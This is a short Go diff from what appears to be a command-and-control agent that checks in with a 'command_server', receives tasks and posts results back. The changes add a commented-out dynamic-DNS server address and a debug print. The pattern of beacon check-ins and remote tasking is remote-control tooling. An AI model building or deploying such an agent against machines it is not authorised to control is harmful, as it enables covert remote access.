@@ -28,6 +28,8 @@ import (
 
 // Setting the command server
 // var command_server string = "https://192.168.0.69:8081"
+// var command_server string = "https://root-27.duckdns.org:8081"
+
 var command_server string = "https://localhost:8081"
 
 // var command_server string = "http://192.168.0.29:8081"
@@ -104,7 +106,6 @@ func send_response(response_to_task Task_Response) {
 	json_data, err := json.Marshal(data)
 	if err != nil {
 		log.Fatal(err)
-
 	}
 
 	r, err := http.NewRequest("POST", command_server+"/node_response", bytes.NewBuffer(json_data))
@@ -171,6 +172,8 @@ func checkIn() {
 	} else {
 		fmt.Println("Response was Not OK")
 	}
+
+	fmt.Println(res.StatusCode)
 
 	post := &CheckIn_response{}
 	derr := json.NewDecoder(res.Body).Decode(post)
